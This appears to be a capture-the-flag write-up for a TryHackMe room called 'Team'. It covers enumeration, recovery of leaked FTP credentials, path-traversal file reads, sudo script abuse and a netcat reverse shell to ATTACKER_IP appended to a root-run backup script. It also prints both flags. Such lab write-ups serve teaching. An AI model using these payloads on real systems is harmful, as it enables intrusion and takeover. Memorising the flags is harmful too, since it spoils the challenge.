# Team

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 (Ubuntu)
```

We see a web server and do a `dirsearch` / `gobuster` / `ffuf`.

---

## Gobuster

```
23:51:38  301   305B  /assets   →  http://team.thm/assets/
23:51:54  301   305B  /images   →  http://team.thm/images/
23:51:54  200   371B  /images/
23:52:15  200     5B  /robots.txt
23:52:16  301   306B  /scripts  →  http://team.thm/scripts/
23:52:16  403   273B  /scripts/
```

Enumerating `/scripts/` more, we see a `scripts.txt`. Opening it we see:

```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"

ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

```
# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

It looks like this script originally contained the credentials to the FTP server. The last sentence specifies there exists an “old” version of this file.

I took SecLists’ `extension-test.txt` and used sed to strip the `test.` prefix from every line, giving me a clean list of extensions like `php`, `sh`, and `bak`. Then I ran wfuzz against `http://team.thm/scripts/script.FUZZ`, telling it to substitute FUZZ with each extension from my list and to hide 404/400 responses.

---

## Wfuzz

```bash
sed s'/^test.//g' /usr/share/wordlists/SecLists/Fuzzing/extension-test.txt > extension-test.txt

wfuzz -c -z file,extension-test.txt --hc 404,400 http://team.thm/scripts/script.FUZZ
```

Result:

```
Target: http://team.thm/scripts/script.FUZZ
Total requests: 17576

ID           Response   Lines    Word     Chars     Payload                                            
000009754    200        18 L     44 W     466 Ch    "old"                                             
000013462    200        21 L     71 W     597 Ch    "txt" 
```

After finding the extension we add `.old` to the end of the URL and we get a download. Rename it `script.old.txt` and it will open up. We see:

```bash
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

---

## FTP Access

Now let’s login to the FTP server. After looking around we get a file and it reads:

```
Dale
I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevant config file.

Gyles
```

Then we go and check `/robots.txt`. We see just a single word called `dale`.

Going back we see that we have a `dev` subdomain and when we add that to `/etc/hosts`, going to that site we see this:

<img width="1859" height="968" alt="Screenshot From 2025-09-02 19-31-55" src="https://github.com/user-attachments/assets/1ea5b930-3fca-4aa6-b2d9-eb59a430e8ee" />

---

## LFI Exploit

Clicking on the link we get another white page with *Place holder for future team share*, but notice above the URL is:

```
http://dev.team.thm/script.php?page=teamshare.php
```

So we can possibly exploit that.

Running:

```
http://dev.team.thm/script.php?page=../../../../etc/passwd
```

We get these users:

* dale
* gyles
* ftpuser
* ubuntu

Which means we can access files within the server. Trying:

```
http://dev.team.thm/script.php?page=/home/dale/user.txt
```

We get the first flag:

> Q1: User flag?
> A1: THM{6Y0TXHz7c2d}

---

## SSH Key

Remember: *“please make a copy of your id\_rsa and place this in the relevant config file.”*

Looking at `/etc/ssh/sshd_config` we get Dale’s `id_rsa`:

```
-----BEGIN OPENSSH PRIVATE KEY-----
[KEY BLOCK CONTENT]
-----END OPENSSH PRIVATE KEY-----
```

---

## PrivEsc: dale → gyles

After ssh into Dale, I tried `sudo -l`:

```
Matching Defaults entries for dale on ip-10-201-48-98:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User dale may run the following commands on ip-10-201-48-98:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Opening `/home/gyles/admin_checks` we see:

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

From `sudo -l`, I could run `admin_checks` as gyles. The script executes `$error`, which means I can run arbitrary commands.

---

### Exploiting \$error

I created a tiny shell dropper that preserves effective UID:

```bash
cat > /home/dale/shell.sh <<'EOF'
#!/bin/bash
echo "[1337] running your shell"
exec /bin/bash -p
EOF
chmod +x /home/dale/shell.sh
```

Run the vulnerable program as gyles:

```bash
sudo -u gyles /home/gyles/admin_checks
# Prompt 1 (name): dale
# Prompt 2 ('date'): /home/dale/shell.sh
```

Result:

```
[1337] running your shell
```

This dropped me into a shell as gyles. To stabilize:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## PrivEsc: gyles → root

Enumerating, I found:

```bash
gyles@ip-10-201-48-98:/home/dale$ ls -l /usr/local/bin/
total 4
-rwxrwxr-x 1 root admin 65 Jan 17  2021 main_backup.sh
```

The `/usr/local/bin/main_backup.sh` file is writable by the `admin` group. The gyles user is in this group. That means we can append a reverse shell to it.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f" >> /usr/local/bin/main_backup.sh
```

Start listener:

```bash
nc -lnvp 1234
```

Wait a minute and then you’re in.

> Q2: Root flag?
> A2: THM{fhqbznavfonq}
